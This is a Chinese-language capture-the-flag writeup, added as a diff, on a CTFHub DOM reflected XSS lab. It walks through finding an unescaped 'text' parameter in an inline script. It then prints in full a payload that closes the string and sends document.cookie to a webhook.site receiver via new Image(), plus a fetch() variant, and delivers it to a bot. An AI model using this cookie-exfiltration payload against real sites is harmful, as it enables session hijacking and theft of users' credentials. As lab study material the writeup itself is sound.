@@ -1,0 +1,78 @@
+---
+layout: writeup
+tags: [ctfhub]
+
+title: "CTFHub CTF Writeup - DOM反射"
+date: 2026-10-28
+
+skill: "web-xss/DOM反射"
+completed: true
+---
+
+# CTFHub Writeup - DOM反射
+
+## 题目类型
+
+Web
+
+## 题目描述
+
+XSS DOM Reflex
+CHange text
+CTFHub is very niubility
+Hello, CTFHub
+CTFHub is very niubility
+
+Send URL to Bot
+URL
+
+
+## 解题过程
+
+<br>1. 先请求根路径确认入口：设置 $BASE 后执行 curl.exe -si "$BASE/"，返回 HTTP/1.1 302 Found，Location: /?text=CTFHub%20is%20very%20niubility，说明 text 参数是核心入口。
+<br>2. 随后请求 /?text=abc 查看页面源码，发现参数被拼进内联脚本：$("\#text")\[0\].innerHTML = 'abc';，页面底部还存在向 /submit 提交 JSON 的 bot 投递接口。
+<br>3. 验证闭合与转义：用 curl -G --data-urlencode 分别提交 \<b\>bold\</b\> 和 a'b，输出仍为 $("\#text")\[0\].innerHTML = '\<b\>bold\</b\>'; 与 $("\#text")\[0\].innerHTML = 'a'b';；\<b\> 未被 HTML 实体转义，单引号未被转义，因此可通过 '; 闭合 JS 字符串。
+<br>4. 为接收 bot 的 cookie，使用 webhook.site 创建 token，UUID 为 fa6d599d-8a67-41a9-844a-6eecaafb9ccd，接收地址为 https://webhook.site/fa6d599d-8a67-41a9-844a-6eecaafb9ccd；并访问该地址的 ?c=manual-test 后查询 requests API，确认接收端可用。
+<br>5. 构造 payload：';new Image().src='https://webhook.site/fa6d599d-8a67-41a9-844a-6eecaafb9ccd/?c='+encodeURIComponent(document.cookie);//；用 curl -G --data-urlencode 编码后得到最终 URL，payload 闭合单引号、执行 new Image() 外带 cookie，并用 // 注释尾部原语句。
+<br>6. 向 /submit 投递 URL：该接口接收 JSON 形式的 url 字段；PowerShell 5.1 直接 -d 携带 JSON 会被吞双引号导致 400，于是将 JSON 写入 body.json 并以 --data-binary "@body.json" 提交，返回 code=0、msg=Successfully，HTTP 200。
+<br>7. 等待约 10 秒后查询 webhook.site 的 requests API，命中请求的 UA 为 HeadlessChrome/112、referer 为靶场地址、sec-fetch-dest 为 image，query.c 为 flag=ctfhub\{061fdac864f521bbb47d54a4\}，据此确认 bot 被触发并取得 flag。
+
+## 其他方法
+
+推测还存在一种同类外带写法：';fetch('https://webhook.site/\<uuid\>/?c='+document.cookie)//，记录中仅作为可选写法提及，未显示实际执行结果。
+
+
+## 疑问与解答
+
+### 1.
+
+<br>问题：为什么 payload 开头用 ';、结尾用 //？
+<br>解答：目标把输入放进单引号包裹的 JavaScript 字符串中，开头的 ' 先闭合字符串，; 结束原赋值语句，随后执行注入代码；结尾 // 注释掉服务端模板剩余的单引号和分号，避免语法错误。
+
+### 2.
+
+<br>问题：为什么拿到 flag 需要把 cookie 发到外部接收端？
+<br>解答：flag 位于 bot 浏览器的 document.cookie 中，XSS 代码在 bot 侧执行，需要主动发起一个到外部服务的请求并把 cookie 作为参数带出；new Image().src 会触发 GET 请求，接收端记录 query 后即可读取。
+
+### 3.
+
+<br>问题：怎样判断命中请求来自 bot 而不是本机自测？
+<br>解答：可结合请求的 User-Agent 是否为 HeadlessChrome、Referer 是否指向靶场、以及 sec-fetch-dest 等字段判断；本题命中记录中的这些特征与 bot 访问相符。
+
+
+## 本题的核心逻辑：
+
+
+
+<br>本题的注入点是 GET 参数 text：服务端把 text 原样拼进内联脚本的单引号字符串，最终由 innerHTML 写入 DOM。由于单引号和 HTML 标签未被转义，输入可以闭合脚本字符串并执行任意 JavaScript，形成反射型与 DOM sink 组合的 XSS。
+
+<br>XSS 执行后，脚本运行在 bot 的页面上下文，可读取 document.cookie 并通过跨域 GET 外带；接收端根据请求中的 query 参数取得 flag。bot 投递接口用于让自动化浏览器访问恶意 URL，是本题的触发环节。
+
+
+## 笔记
+
+这道题主要学习了：
+
+<br>1. DOM 反射型 XSS 的关键是找到可控输入进入危险 sink 的路径，并确认闭合条件。本题中 text 被拼进内联脚本的字符串常量，最终落入 innerHTML；未转义的单引号允许跳出字符串，// 用于吞掉尾部模板代码。
+<br>2. 带外通道是 CTF 中处理 bot cookie 的常用思路：先建立可查询的接收端，再让 XSS 通过 new Image() 或类似方式发出携带 document.cookie 的请求，最后从接收端日志中提取 flag。
+<br>3. 复盘时还应记录工具层问题，例如 PowerShell 5.1 的引号处理可能破坏 JSON 请求体；将 body 写入文件并用 --data-binary @file 提交，可减少 shell 转义干扰。
